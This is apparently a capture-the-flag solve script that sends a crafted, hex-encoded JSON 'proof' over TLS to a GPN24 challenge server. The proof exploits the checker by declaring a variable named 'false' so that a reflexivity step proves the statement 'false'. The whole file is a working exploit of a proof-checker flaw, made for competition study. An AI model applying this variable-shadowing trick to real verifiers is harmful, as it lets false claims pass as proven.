#!/usr/bin/env python3
import json
import socket
import ssl


HOST = "smoked-fish-fingers-on-braised-potato-xjyf.gpn24.ctf.kitctf.de"
PORT = 443


def build_payload():
    payload = {
        "content": [
            {
                "ty": "thm",
                "name": "pwn",
                "vars": {"false": "bool"},
                "prop": "false",
                "proof": [
                    {
                        "id": "0",
                        "rule": "reflexive",
                        "args": "false",
                        "prevs": [],
                        "th": "",
                    }
                ],
            }
        ]
    }
    return json.dumps(payload, separators=(",", ":")).encode().hex().encode() + b"\n"


def main():
    payload = build_payload()
    ctx = ssl.create_default_context()

    with socket.create_connection((HOST, PORT), timeout=10) as sock:
        with ctx.wrap_socket(sock, server_hostname=HOST) as ssock:
            ssock.sendall(payload)
            ssock.settimeout(5)

            chunks = []
            while True:
                try:
                    data = ssock.recv(4096)
                except TimeoutError:
                    break
                if not data:
                    break
                chunks.append(data)

    print(b"".join(chunks).decode("utf-8", "replace"))


if __name__ == "__main__":
    main()
